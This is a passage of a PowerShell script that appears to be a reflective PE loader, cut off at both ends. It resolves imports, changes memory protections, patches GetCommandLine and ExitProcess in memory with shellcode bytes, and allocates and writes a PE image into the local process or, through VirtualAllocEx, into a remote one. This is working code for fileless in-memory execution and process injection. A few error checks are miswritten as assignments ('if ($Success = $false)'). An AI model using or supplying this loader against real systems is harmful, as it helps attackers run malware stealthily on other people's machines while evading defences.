                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        # We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48    #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        # I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        # It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        # argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            # call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    # It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ########## FUNCTIONS ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                # which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero                #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero        #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }        
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle) EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
